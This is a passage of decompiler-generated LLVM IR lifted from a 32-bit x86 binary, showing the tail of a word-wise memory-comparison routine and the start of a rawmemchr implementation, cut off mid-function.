  %v1_8066bb1 = icmp eq i1 %v12_8066ba6, false
  br i1 %v1_8066bb1, label %dec_label_pc_8066bd2, label %dec_label_pc_8066bb3

dec_label_pc_8066bb3:                             ; preds = %dec_label_pc_8066ba3
  %v1_8066bb3 = add i32 %v0_8066bb3, -4
  %v9_8066bb3 = icmp eq i32 %v1_8066bb3, 0
  br i1 %v9_8066bb3, label %dec_label_pc_8066bc0, label %dec_label_pc_8066bb8

dec_label_pc_8066bb8:                             ; preds = %dec_label_pc_8066bb3
  %v1_8066bb8 = add i32 %v0_8066bb8, 16
  store i32 %v1_8066bb8, i32* @ecx, align 4
  %v1_8066bbb = add i32 %v0_8066bbb, 16
  br label %dec_label_pc_8066b77

dec_label_pc_8066bc0:                             ; preds = %dec_label_pc_8066bb3
  %v15_8066bc2 = icmp eq i32 %v3_8066ba3, %v3_8066bae
  br i1 %v15_8066bc2, label %dec_label_pc_8066d43, label %dec_label_pc_8066bcc

dec_label_pc_8066bcc:                             ; preds = %dec_label_pc_8066bc0, %dec_label_pc_8066b77
  %v0_8066bd0 = phi i32 [ %v4_8066b77, %dec_label_pc_8066b77 ], [ %v3_8066bae, %dec_label_pc_8066bc0 ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_8066b77 ], [ %v3_8066ba3, %dec_label_pc_8066bc0 ]
  store i32 %stack_var_-48.1, i32* @eax, align 4
  store i32 %v0_8066bd0, i32* @edx, align 4
  br label %dec_label_pc_8066bd2

dec_label_pc_8066bd2:                             ; preds = %dec_label_pc_8066ba3, %dec_label_pc_8066b81, %dec_label_pc_8066b9b, %dec_label_pc_8066bcc
  %v0_8066bd2 = call i32 @memcmp_bytes()
  br label %dec_label_pc_8066d43

dec_label_pc_8066bdc:                             ; preds = %dec_label_pc_8066b19
  %v2_8066be0 = mul nuw nsw i32 %v1_8066b1b, 8
  %v6_8066beb = sub nsw i32 32, %v2_8066be0
  %v2_8066bef = udiv i32 %stack_var_12.0.lcssa, 4
  %v1_8066c00 = and i32 %v0_8066bf6, -4
  store i32 %v1_8066c00, i32* @edx, align 4
  %v1_8066c03 = urem i32 %v2_8066bef, 4
  %v9_8066c06 = icmp eq i32 %v1_8066c03, 1
  br i1 %v9_8066c06, label %dec_label_pc_8066c56, label %dec_label_pc_8066c0b

dec_label_pc_8066c0b:                             ; preds = %dec_label_pc_8066bdc
  %v2_8066c03 = icmp eq i32 %v1_8066c03, 0
  br i1 %v2_8066c03, label %dec_label_pc_8066c46, label %dec_label_pc_8066c0d

dec_label_pc_8066c0d:                             ; preds = %dec_label_pc_8066c0b
  %v9_8066c0d = icmp eq i32 %v1_8066c03, 3
  %v1_8066c10 = inttoptr i32 %v1_8066c00 to i32*
  %v2_8066c10 = load i32, i32* %v1_8066c10, align 4
  %v1_8066c12 = inttoptr i32 %v0_8066c62 to i32*
  %v2_8066c12 = load i32, i32* %v1_8066c12, align 4
  %v1_8066c14 = add i32 %v1_8066c00, 4
  %v2_8066c14 = inttoptr i32 %v1_8066c14 to i32*
  %v3_8066c14 = load i32, i32* %v2_8066c14, align 4
  br i1 %v9_8066c0d, label %dec_label_pc_8066c33, label %dec_label_pc_8066c19

dec_label_pc_8066c19:                             ; preds = %dec_label_pc_8066c0d
  %v4_8066c19 = add nuw nsw i32 %v2_8066bef, 2
  %v1_8066c20 = add i32 %v1_8066c00, -4
  store i32 %v1_8066c20, i32* @edx, align 4
  %v1_8066c23 = add i32 %v0_8066c62, -8
  store i32 %v1_8066c23, i32* @ebx, align 4
  br label %bb170

dec_label_pc_8066c33:                             ; preds = %dec_label_pc_8066c0d
  %v4_8066c33 = add nuw nsw i32 %v2_8066bef, 1
  %v1_8066c39 = add i32 %v0_8066c62, -4
  store i32 %v1_8066c39, i32* @ebx, align 4
  br label %bb165

dec_label_pc_8066c46:                             ; preds = %dec_label_pc_8066c0b
  %v1_8066c46 = add i32 %v1_8066c00, 4
  %v2_8066c46 = inttoptr i32 %v1_8066c46 to i32*
  %v3_8066c46 = load i32, i32* %v2_8066c46, align 4
  %v1_8066c49 = inttoptr i32 %v1_8066c00 to i32*
  %v2_8066c49 = load i32, i32* %v1_8066c49, align 4
  store i32 %v1_8066c46, i32* @edx, align 4
  %v1_8066c52 = inttoptr i32 %v0_8066c62 to i32*
  %v2_8066c52 = load i32, i32* %v1_8066c52, align 4
  br label %bb160

dec_label_pc_8066c56:                             ; preds = %dec_label_pc_8066bdc
  %v1_8066c56 = inttoptr i32 %v1_8066c00 to i32*
  %v2_8066c56 = load i32, i32* %v1_8066c56, align 4
  %v1_8066c5c = add i32 %v1_8066c00, 4
  %v2_8066c5c = inttoptr i32 %v1_8066c5c to i32*
  %v3_8066c5c = load i32, i32* %v2_8066c5c, align 4
  %v1_8066c5f = add i32 %v1_8066c00, 8
  store i32 %v1_8066c5f, i32* @edx, align 4
  %v1_8066c62 = inttoptr i32 %v0_8066c62 to i32*
  %v2_8066c62 = load i32, i32* %v1_8066c62, align 4
  %v1_8066c64 = add i32 %v0_8066c62, 4
  store i32 %v1_8066c64, i32* @ebx, align 4
  %v4_8066c67 = add nsw i32 %v2_8066bef, -1
  br label %bb155

bb155:                                            ; preds = %dec_label_pc_8066d15, %dec_label_pc_8066c56
  %storemerge9.pre = phi i32 [ %v3_8066ced, %dec_label_pc_8066d15 ], [ %v2_8066c62, %dec_label_pc_8066c56 ]
  %v0_8066c84 = phi i32 [ %v3_8066cea, %dec_label_pc_8066d15 ], [ %v3_8066c5c, %dec_label_pc_8066c56 ]
  %v0_8066c79 = phi i32 [ %v1_8066d18, %dec_label_pc_8066d15 ], [ %v1_8066c64, %dec_label_pc_8066c56 ]
  %v6_8066c6d = phi i32 [ %v8_8066cf2, %dec_label_pc_8066d15 ], [ %v0_8066bf6, %dec_label_pc_8066c56 ]
  %v0_8066c6b = phi i32 [ %v1_8066d15, %dec_label_pc_8066d15 ], [ %v1_8066c5f, %dec_label_pc_8066c56 ]
  %stack_var_-24.0 = phi i32 [ %v4_8066d0e, %dec_label_pc_8066d15 ], [ %v4_8066c67, %dec_label_pc_8066c56 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.1, %dec_label_pc_8066d15 ], [ %v2_8066c56, %dec_label_pc_8066c56 ]
  %v1_8066c6b = inttoptr i32 %v0_8066c6b to i32*
  %v2_8066c6b = load i32, i32* %v1_8066c6b, align 4
  %v7_8066c6d = and i32 %v6_8066c6d, -256
  %v1_8066c79 = inttoptr i32 %v0_8066c79 to i32*
  %v2_8066c79 = load i32, i32* %v1_8066c79, align 4
  %v5_8066c7b = lshr i32 %stack_var_-36.0, %v2_8066be0
  %v8_8066c7d = or i32 %v7_8066c6d, %v6_8066beb
  %v2_8066c86 = and i32 %v6_8066beb, 24
  %v4_8066c86 = icmp eq i32 %v2_8066c86, 0
  br i1 %v4_8066c86, label %bb158, label %bb156

bb156:                                            ; preds = %bb155
  %v5_8066c86 = shl i32 %v0_8066c84, %v2_8066c86
  br label %bb158

bb158:                                            ; preds = %bb155, %bb156
  %v3_8066c88 = phi i32 [ %v0_8066c84, %bb155 ], [ %v5_8066c86, %bb156 ]
  %v4_8066c88 = or i32 %v3_8066c88, %v5_8066c7b
  %v14_8066c8b = icmp eq i32 %v4_8066c88, %storemerge9.pre
  br i1 %v14_8066c8b, label %bb160, label %dec_label_pc_8066d09

bb160:                                            ; preds = %bb158, %dec_label_pc_8066c46
  %v1_8066cb0 = phi i32 [ %v2_8066c79, %bb158 ], [ %v2_8066c52, %dec_label_pc_8066c46 ]
  %v0_8066ca9 = phi i32 [ %v0_8066c79, %bb158 ], [ %v0_8066c62, %dec_label_pc_8066c46 ]
  %v0_8066ca3 = phi i32 [ %v0_8066c84, %bb158 ], [ %v2_8066c49, %dec_label_pc_8066c46 ]
  %v6_8066c97 = phi i32 [ %v8_8066c7d, %bb158 ], [ %v3_8066c46, %dec_label_pc_8066c46 ]
  %v0_8066cac = phi i32 [ %v2_8066c6b, %bb158 ], [ %v3_8066c46, %dec_label_pc_8066c46 ]
  %v0_8066c94 = phi i32 [ %v0_8066c6b, %bb158 ], [ %v1_8066c46, %dec_label_pc_8066c46 ]
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %bb158 ], [ %v2_8066bef, %dec_label_pc_8066c46 ]
  %v1_8066c94 = add i32 %v0_8066c94, 4
  %v2_8066c94 = inttoptr i32 %v1_8066c94 to i32*
  %v3_8066c94 = load i32, i32* %v2_8066c94, align 4
  %v7_8066c97 = and i32 %v6_8066c97, -256
  %v5_8066ca3 = lshr i32 %v0_8066ca3, %v2_8066be0
  %v8_8066ca5 = or i32 %v7_8066c97, %v6_8066beb
  %v1_8066ca9 = add i32 %v0_8066ca9, 4
  %v2_8066ca9 = inttoptr i32 %v1_8066ca9 to i32*
  %v3_8066ca9 = load i32, i32* %v2_8066ca9, align 4
  %v2_8066cac = and i32 %v6_8066beb, 24
  %v4_8066cac = icmp eq i32 %v2_8066cac, 0
  br i1 %v4_8066cac, label %bb163, label %bb161

bb161:                                            ; preds = %bb160
  %v5_8066cac = shl i32 %v0_8066cac, %v2_8066cac
  br label %bb163

bb163:                                            ; preds = %bb160, %bb161
  %v1_8066cae = phi i32 [ %v0_8066cac, %bb160 ], [ %v5_8066cac, %bb161 ]
  %v2_8066cae = or i32 %v1_8066cae, %v5_8066ca3
  %v12_8066cb0 = icmp eq i32 %v2_8066cae, %v1_8066cb0
  br i1 %v12_8066cb0, label %bb165, label %dec_label_pc_8066cde

bb165:                                            ; preds = %bb163, %dec_label_pc_8066c33
  %storemerge10.pre = phi i32 [ %v3_8066ca9, %bb163 ], [ %v2_8066c12, %dec_label_pc_8066c33 ]
  %v0_8066ccb = phi i32 [ %v0_8066ca9, %bb163 ], [ %v1_8066c39, %dec_label_pc_8066c33 ]
  %v6_8066cbb = phi i32 [ %v8_8066ca5, %bb163 ], [ %v2_8066c10, %dec_label_pc_8066c33 ]
  %stack_var_-28.1 = phi i32 [ %v0_8066cac, %bb163 ], [ %v2_8066c10, %dec_label_pc_8066c33 ]
  %v0_8066cb8 = phi i32 [ %v0_8066c94, %bb163 ], [ %v1_8066c00, %dec_label_pc_8066c33 ]
  %stack_var_-24.2 = phi i32 [ %stack_var_-24.1, %bb163 ], [ %v4_8066c33, %dec_label_pc_8066c33 ]
  %v0_8066cd4 = phi i32 [ %v3_8066c94, %bb163 ], [ %v3_8066c14, %dec_label_pc_8066c33 ]
  %v1_8066cb8 = add i32 %v0_8066cb8, 8
  %v2_8066cb8 = inttoptr i32 %v1_8066cb8 to i32*
  %v3_8066cb8 = load i32, i32* %v2_8066cb8, align 4
  %v7_8066cbb = and i32 %v6_8066cbb, -256
  %v1_8066ccb = add i32 %v0_8066ccb, 8
  %v2_8066ccb = inttoptr i32 %v1_8066ccb to i32*
  %v3_8066ccb = load i32, i32* %v2_8066ccb, align 4
  %v5_8066cce = lshr i32 %stack_var_-28.1, %v2_8066be0
  %v8_8066cd0 = or i32 %v7_8066cbb, %v6_8066beb
  %v2_8066cd4 = and i32 %v6_8066beb, 24
  %v4_8066cd4 = icmp eq i32 %v2_8066cd4, 0
  br i1 %v4_8066cd4, label %bb168, label %bb166

bb166:                                            ; preds = %bb165
  %v5_8066cd4 = shl i32 %v0_8066cd4, %v2_8066cd4
  br label %bb168

bb168:                                            ; preds = %bb165, %bb166
  %v1_8066cd6 = phi i32 [ %v0_8066cd4, %bb165 ], [ %v5_8066cd4, %bb166 ]
  %v2_8066cd6 = or i32 %v1_8066cd6, %v5_8066cce
  %v12_8066cd8 = icmp eq i32 %v2_8066cd6, %storemerge10.pre
  br i1 %v12_8066cd8, label %bb170, label %dec_label_pc_8066cde

dec_label_pc_8066cde:                             ; preds = %bb168, %bb163
  %v0_8066cde = phi i32 [ %v2_8066cae, %bb163 ], [ %v2_8066cd6, %bb168 ]
  %storemerge10 = phi i32 [ %v1_8066cb0, %bb163 ], [ %storemerge10.pre, %bb168 ]
  store i32 %storemerge10, i32* @edx, align 4
  store i32 %v0_8066cde, i32* @eax, align 4
  br label %dec_label_pc_8066d3a

bb170:                                            ; preds = %bb168, %dec_label_pc_8066c19
  %v3_8066d02 = phi i32 [ %v3_8066ccb, %bb168 ], [ %v2_8066c12, %dec_label_pc_8066c19 ]
  %v0_8066d18 = phi i32 [ %v0_8066ccb, %bb168 ], [ %v1_8066c23, %dec_label_pc_8066c19 ]
  %v0_8066d15 = phi i32 [ %v0_8066cb8, %bb168 ], [ %v1_8066c20, %dec_label_pc_8066c19 ]
  %v6_8066ce2 = phi i32 [ %v8_8066cd0, %bb168 ], [ %v2_8066c10, %dec_label_pc_8066c19 ]
  %stack_var_-32.1 = phi i32 [ %v0_8066cd4, %bb168 ], [ %v2_8066c10, %dec_label_pc_8066c19 ]
  %stack_var_-24.3 = phi i32 [ %stack_var_-24.2, %bb168 ], [ %v4_8066c19, %dec_label_pc_8066c19 ]
  %stack_var_-36.1 = phi i32 [ %v3_8066cb8, %bb168 ], [ %v3_8066c14, %dec_label_pc_8066c19 ]
  %v7_8066ce2 = and i32 %v6_8066ce2, -256
  %v1_8066cea = add i32 %v0_8066d15, 12
  %v2_8066cea = inttoptr i32 %v1_8066cea to i32*
  %v3_8066cea = load i32, i32* %v2_8066cea, align 4
  %v1_8066ced = add i32 %v0_8066d18, 12
  %v2_8066ced = inttoptr i32 %v1_8066ced to i32*
  %v3_8066ced = load i32, i32* %v2_8066ced, align 4
  %v5_8066cf0 = lshr i32 %stack_var_-32.1, %v2_8066be0
  %v8_8066cf2 = or i32 %v7_8066ce2, %v6_8066beb
  %v2_8066cfd = and i32 %v6_8066beb, 24
  %v4_8066cfd = icmp eq i32 %v2_8066cfd, 0
  br i1 %v4_8066cfd, label %bb173, label %bb171

bb171:                                            ; preds = %bb170
  %v5_8066cfd = shl i32 %stack_var_-36.1, %v2_8066cfd
  br label %bb173

bb173:                                            ; preds = %bb170, %bb171
  %v3_8066cff = phi i32 [ %stack_var_-36.1, %bb170 ], [ %v5_8066cfd, %bb171 ]
  %v4_8066cff = or i32 %v3_8066cff, %v5_8066cf0
  %v14_8066d02 = icmp eq i32 %v4_8066cff, %v3_8066d02
  br i1 %v14_8066d02, label %dec_label_pc_8066d0e, label %dec_label_pc_8066d09

dec_label_pc_8066d09:                             ; preds = %bb158, %bb173
  %v2_8066d09 = phi i32 [ %v4_8066cff, %bb173 ], [ %v4_8066c88, %bb158 ]
  %storemerge9 = phi i32 [ %v3_8066d02, %bb173 ], [ %storemerge9.pre, %bb158 ]
  store i32 %storemerge9, i32* @edx, align 4
  store i32 %v2_8066d09, i32* @eax, align 4
  br label %dec_label_pc_8066d3a

dec_label_pc_8066d0e:                             ; preds = %bb173
  %v4_8066d0e = add i32 %stack_var_-24.3, -4
  %v12_8066d0e = icmp eq i32 %v4_8066d0e, 0
  br i1 %v12_8066d0e, label %bb175, label %dec_label_pc_8066d15

dec_label_pc_8066d15:                             ; preds = %dec_label_pc_8066d0e
  %v1_8066d15 = add i32 %v0_8066d15, 16
  store i32 %v1_8066d15, i32* @edx, align 4
  %v1_8066d18 = add i32 %v0_8066d18, 16
  store i32 %v1_8066d18, i32* @ebx, align 4
  br label %bb155

bb175:                                            ; preds = %dec_label_pc_8066d0e
  %v5_8066d28 = lshr i32 %stack_var_-36.1, %v2_8066be0
  br i1 %v4_8066cfd, label %bb178, label %bb176

bb176:                                            ; preds = %bb175
  %v5_8066d2e = shl i32 %v3_8066cea, %v2_8066cfd
  br label %bb178

bb178:                                            ; preds = %bb175, %bb176
  %v1_8066d32 = phi i32 [ %v3_8066cea, %bb175 ], [ %v5_8066d2e, %bb176 ]
  store i32 0, i32* @ecx, align 4
  %v2_8066d32 = or i32 %v1_8066d32, %v5_8066d28
  store i32 %v2_8066d32, i32* @eax, align 4
  %v12_8066d34 = icmp eq i32 %v2_8066d32, %v3_8066ced
  br i1 %v12_8066d34, label %dec_label_pc_8066d41, label %dec_label_pc_8066d38

dec_label_pc_8066d38:                             ; preds = %bb178
  store i32 %v3_8066ced, i32* @edx, align 4
  br label %dec_label_pc_8066d3a

dec_label_pc_8066d3a:                             ; preds = %dec_label_pc_8066d09, %dec_label_pc_8066cde, %dec_label_pc_8066d38
  %v0_8066d3a = call i32 @memcmp_bytes()
  store i32 %v0_8066d3a, i32* @ecx, align 4
  br label %dec_label_pc_8066d41

dec_label_pc_8066d41:                             ; preds = %bb178, %dec_label_pc_8066d3a
  %v0_8066d41 = phi i32 [ 0, %bb178 ], [ %v0_8066d3a, %dec_label_pc_8066d3a ]
  br label %dec_label_pc_8066d43

dec_label_pc_8066d43:                             ; preds = %dec_label_pc_8066bc0, %dec_label_pc_8066bd2, %dec_label_pc_8066d41
  %v0_8066d43 = phi i32 [ 0, %dec_label_pc_8066bc0 ], [ %v0_8066bd2, %dec_label_pc_8066bd2 ], [ %v0_8066d41, %dec_label_pc_8066d41 ]
  %v1_8066d43 = icmp eq i32 %v0_8066d43, 0
  %v1_8066d45 = icmp eq i1 %v1_8066d43, false
  br i1 %v1_8066d45, label %dec_label_pc_8066d7c, label %dec_label_pc_8066d47

dec_label_pc_8066d47:                             ; preds = %dec_label_pc_8066d43
  %v4_8066d53 = urem i32 %stack_var_12.0.lcssa, 4
  %v1_8066d58 = and i32 %stack_var_12.0.lcssa, -4
  %v2_8066d5b = add i32 %v1_8066d58, %v0_8066bf6
  store i32 %v2_8066d5b, i32* @ecx, align 4
  %v2_8066d5d = add i32 %v1_8066d58, %v0_8066c62
  br label %dec_label_pc_8066d73.preheader

dec_label_pc_8066d73.preheader:                   ; preds = %dec_label_pc_8066d47, %entry
  %v0_8066d64123 = phi i32 [ %v4_8066aeb, %entry ], [ %v2_8066d5b, %dec_label_pc_8066d47 ]
  %v0_8066d61121 = phi i32 [ %v4_8066aef, %entry ], [ %v2_8066d5d, %dec_label_pc_8066d47 ]
  %stack_var_12.1.ph = phi i32 [ %tmp148, %entry ], [ %v4_8066d53, %dec_label_pc_8066d47 ]
  %v4_8066d7334 = icmp eq i32 %stack_var_12.1.ph, 0
  %v1_8066d7841 = icmp eq i1 %v4_8066d7334, false
  br i1 %v1_8066d7841, label %dec_label_pc_8066d61, label %dec_label_pc_8066d7a

dec_label_pc_8066d61:                             ; preds = %dec_label_pc_8066d73.preheader, %dec_label_pc_8066d6d
  %v0_8066d71 = phi i32 [ %v1_8066d71, %dec_label_pc_8066d6d ], [ %v0_8066d64123, %dec_label_pc_8066d73.preheader ]
  %v0_8066d72 = phi i32 [ %v1_8066d72, %dec_label_pc_8066d6d ], [ %v0_8066d61121, %dec_label_pc_8066d73.preheader ]
  %stack_var_12.142 = phi i32 [ %v4_8066d6d, %dec_label_pc_8066d6d ], [ %stack_var_12.1.ph, %dec_label_pc_8066d73.preheader ]
  %v1_8066d61 = inttoptr i32 %v0_8066d72 to i8*
  %v2_8066d61 = load i8, i8* %v1_8066d61, align 1
  %v3_8066d61 = zext i8 %v2_8066d61 to i32
  %v1_8066d64 = inttoptr i32 %v0_8066d71 to i8*
  %v2_8066d64 = load i8, i8* %v1_8066d64, align 1
  %v3_8066d64 = zext i8 %v2_8066d64 to i32
  %v2_8066d67 = sub nsw i32 %v3_8066d64, %v3_8066d61
  %v12_8066d67 = icmp eq i32 %v2_8066d67, 0
  store i32 %v2_8066d67, i32* @edx, align 4
  %v1_8066d6b = icmp eq i1 %v12_8066d67, false
  br i1 %v1_8066d6b, label %dec_label_pc_8066d7c, label %dec_label_pc_8066d6d

dec_label_pc_8066d6d:                             ; preds = %dec_label_pc_8066d61
  %v4_8066d6d = add i32 %stack_var_12.142, -1
  %v11_8066d6d = icmp eq i32 %v4_8066d6d, 0
  %v1_8066d71 = add i32 %v0_8066d71, 1
  store i32 %v1_8066d71, i32* @ecx, align 4
  %v1_8066d72 = add i32 %v0_8066d72, 1
  %v1_8066d78 = icmp eq i1 %v11_8066d6d, false
  br i1 %v1_8066d78, label %dec_label_pc_8066d61, label %dec_label_pc_8066d7a

dec_label_pc_8066d7a:                             ; preds = %dec_label_pc_8066d6d, %dec_label_pc_8066d73.preheader
  br label %dec_label_pc_8066d7c

dec_label_pc_8066d7c:                             ; preds = %dec_label_pc_8066afa, %dec_label_pc_8066d61, %dec_label_pc_8066d43, %dec_label_pc_8066d7a
  %v0_8066d83 = phi i32 [ %v0_8066d43, %dec_label_pc_8066d43 ], [ 0, %dec_label_pc_8066d7a ], [ %v2_8066d67, %dec_label_pc_8066d61 ], [ %v2_8066b00, %dec_label_pc_8066afa ]
  store i32 %v0_8066ae2, i32* @ebx, align 4
  ret i32 %v0_8066d83

; uselistorder directives
  uselistorder i32 %v1_8066d71, { 1, 0 }
  uselistorder i32 %v4_8066d6d, { 1, 0 }
  uselistorder i32 %v1_8066d58, { 1, 0 }
  uselistorder i32 %v1_8066d18, { 1, 0 }
  uselistorder i32 %v1_8066d15, { 1, 0 }
  uselistorder i32 %v4_8066d0e, { 1, 0 }
  uselistorder i32 %v4_8066cff, { 1, 0 }
  uselistorder i32 %v3_8066ced, { 2, 0, 1 }
  uselistorder i32 %v3_8066cea, { 1, 2, 0 }
  uselistorder i32 %stack_var_-36.1, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8066d02, { 1, 0 }
  uselistorder i32 %v2_8066cd6, { 1, 0 }
  uselistorder i32 %v0_8066cd4, { 2, 0, 1 }
  uselistorder i32 %storemerge10.pre, { 1, 0 }
  uselistorder i32 %v2_8066cae, { 1, 0 }
  uselistorder i32 %v0_8066cac, { 2, 0, 1 }
  uselistorder i32 %v1_8066cb0, { 1, 0 }
  uselistorder i32 %v4_8066c88, { 1, 0 }
  uselistorder i32 %storemerge9.pre, { 1, 0 }
  uselistorder i32 %v3_8066c46, { 1, 0 }
  uselistorder i32 %v3_8066c14, { 1, 0 }
  uselistorder i32 %v2_8066c10, { 3, 0, 2, 1 }
  uselistorder i32 %v1_8066c03, { 2, 0, 1 }
  uselistorder i32 %v1_8066c00, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9 }
  uselistorder i32 %v2_8066bef, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_8066beb, { 7, 0, 4, 1, 5, 2, 6, 3 }
  uselistorder i32 %v2_8066be0, { 1, 2, 5, 4, 3, 0 }
  uselistorder i32 %v1_8066bb8, { 1, 0 }
  uselistorder i32 %v1_8066bb3, { 1, 0 }
  uselistorder i32 %v3_8066bae, { 1, 0, 2 }
  uselistorder i32 %v3_8066ba3, { 1, 0, 2 }
  uselistorder i32 %v0_8066bac, { 1, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v0_8066b9f, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %v4_8066b77, { 1, 0 }
  uselistorder i32 %v1_8066b31, { 2, 0, 1 }
  uselistorder i32 %v2_8066b2c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_8066c62, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32 %stack_var_12.0.lcssa, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8066bf6, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %v1_8066b0f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8066b0e, { 0, 2, 1 }
  uselistorder i32 %v4_8066aef, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_8066aeb, { 2, 1, 0, 3 }
  uselistorder i32 %tmp148, { 2, 1, 0, 3 }
  uselistorder i32 ()* @memcmp_bytes, { 1, 0 }
  uselistorder i32 -8, { 65, 66, 67, 68, 75, 69, 76, 17, 11, 10, 12, 0, 13, 14, 15, 16, 18, 19, 73, 20, 21, 22, 23, 25, 26, 24, 27, 28, 29, 30, 31, 32, 33, 79, 77, 78, 9, 74, 39, 36, 37, 38, 40, 41, 42, 35, 2, 34, 1, 43, 3, 4, 5, 70, 6, 49, 44, 45, 46, 47, 48, 50, 51, 52, 53, 62, 61, 56, 57, 7, 8, 58, 59, 60, 54, 55, 63, 64, 71, 72 }
  uselistorder label %dec_label_pc_8066d7c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8066d61, { 1, 0 }
  uselistorder label %dec_label_pc_8066d43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066d41, { 1, 0 }
  uselistorder label %dec_label_pc_8066d3a, { 2, 0, 1 }
  uselistorder label %bb178, { 1, 0 }
  uselistorder label %dec_label_pc_8066d09, { 1, 0 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_8066bd2, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8066afa, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8066d85 = load i32, i32* @ebx, align 4
  %v4_8066d86 = urem i32 %arg2, 256
  %v4_8066d8a = ptrtoint i8* %arg1 to i32
  %v2_8066d953 = urem i32 %v4_8066d8a, 4
  %v3_8066d954 = icmp eq i32 %v2_8066d953, 0
  %v1_8066d978 = icmp eq i1 %v3_8066d954, false
  %v4_8066d90 = trunc i32 %arg2 to i8
  br i1 %v1_8066d978, label %dec_label_pc_8066d90, label %dec_label_pc_8066d99

dec_label_pc_8066d90:                             ; preds = %entry, %dec_label_pc_8066d94
  %v0_8066d94 = phi i32 [ %v1_8066d94, %dec_label_pc_8066d94 ], [ %v4_8066d8a, %entry ]
  %v1_8066d90 = inttoptr i32 %v0_8066d94 to i8*
  %v2_8066d90 = load i8, i8* %v1_8066d90, align 1
  %v15_8066d90 = icmp eq i8 %v2_8066d90, %v4_8066d90
  br i1 %v15_8066d90, label %dec_label_pc_8066de4, label %dec_label_pc_8066d94

dec_label_pc_8066d94:                             ; preds = %dec_label_pc_8066d90
  %v1_8066d94 = add i32 %v0_8066d94, 1
  %v2_8066d95 = urem i32 %v1_8066d94, 4
  %v3_8066d95 = icmp eq i32 %v2_8066d95, 0
  %v1_8066d97 = icmp eq i1 %v3_8066d95, false
  br i1 %v1_8066d97, label %dec_label_pc_8066d90, label %dec_label_pc_8066d99

dec_label_pc_8066d99:                             ; preds = %entry, %dec_label_pc_8066d94
  %v0_8066d9c = phi i32 [ %v1_8066d94, %dec_label_pc_8066d94 ], [ %v4_8066d8a, %entry ]
  %v2_8066da0 = mul nuw nsw i32 %v4_8066d86, 256
  %v2_8066da3 = or i32 %v2_8066da0, %v4_8066d86
  %v2_8066da7 = mul i32 %v2_8066da3, 65536
  %v2_8066daa = or i32 %v2_8066da7, %v2_8066da3
  br label %dec_label_pc_8066dac

dec_label_pc_8066dac:                             ; preds = %dec_label_pc_8066ddc, %dec_label_pc_8066dac, %dec_label_pc_8066d99
  %v0_8066db0 = phi i32 [ %v0_8066d9c, %dec_label_pc_8066d99 ], [ %v1_8066db0, %dec_label_pc_8066dac ], [ %v1_8066db0, %dec_label_pc_8066ddc ]
  %v2_8066dae = inttoptr i32 %v0_8066db0 to i32*
  %v3_8066dae = load i32, i32* %v2_8066dae, align 4
  %v4_8066dae = xor i32 %v3_8066dae, %v2_8066daa
  %v1_8066db0 = add i32 %v0_8066db0, 4
  store i32 %v1_8066db0, i32* @ecx, align 4
  %v1_8066db3 = add i32 %v4_8066dae, 2130640639
  %v1_8066db9 = sub i32 -1, %v4_8066dae
  store i32 %v1_8066db9, i32* @edx, align 4
  %v2_8066dbb = xor i32 %v1_8066db3, %v1_8066db9
  %v1_8066dbd = and i32 %v2_8066dbb, -2130640640
  %v2_8066dbd = icmp eq i32 %v1_8066dbd, 0
  br i1 %v2_8066dbd, label %dec_label_pc_8066dac, label %dec_label_pc_8066dc4

dec_label_pc_8066dc4:                             ; preds = %dec_label_pc_8066dac
  %v2_8066dc4 = inttoptr i32 %v0_8066db0 to i8*
  %v3_8066dc4 = load i8, i8* %v2_8066dc4, align 1
  %v16_8066dc4 = icmp eq i8 %v3_8066dc4, %v4_8066d90
  br i1 %v16_8066dc4, label %dec_label_pc_8066de4, label %dec_label_pc_8066dcc

dec_label_pc_8066dcc:                             ; preds = %dec_label_pc_8066dc4
  %v1_8066dcc = add i32 %v0_8066db0, 1
  %v2_8066dcc = inttoptr i32 %v1_8066dcc to i8*
  %v3_8066dcc = load i8, i8* %v2_8066dcc, align 1
  %v16_8066dcc = icmp eq i8 %v3_8066dcc, %v4_8066d90
  br i1 %v16_8066dcc, label %dec_label_pc_8066de4, label %dec_label_pc_8066dd4

dec_label_pc_8066dd4:                             ; preds = %dec_label_pc_8066dcc
  %v1_8066dd4 = add i32 %v0_8066db0, 2
  %v2_8066dd4 = inttoptr i32 %v1_8066dd4 to i8*
  %v3_8066dd4 = load i8, i8* %v2_8066dd4, align 1
  %v16_8066dd4 = icmp eq i8 %v3_8066dd4, %v4_8066d90
  br i1 %v16_8066dd4, label %dec_label_pc_8066de4, label %dec_label_pc_8066ddc

dec_label_pc_8066ddc:                             ; preds = %dec_label_pc_8066dd4
  %v1_8066ddc = add i32 %v0_8066db0, 3
  %v2_8066ddc = inttoptr i32 %v1_8066ddc to i8*
  %v3_8066ddc = load i8, i8* %v2_8066ddc, align 1
  %v16_8066ddc = icmp eq i8 %v3_8066ddc, %v4_8066d90
  %v1_8066de2 = icmp eq i1 %v16_8066ddc, false
  br i1 %v1_8066de2, label %dec_label_pc_8066dac, label %dec_label_pc_8066de4

dec_label_pc_8066de4:                             ; preds = %dec_label_pc_8066d90, %dec_label_pc_8066ddc, %dec_label_pc_8066dd4, %dec_label_pc_8066dcc, %dec_label_pc_8066dc4
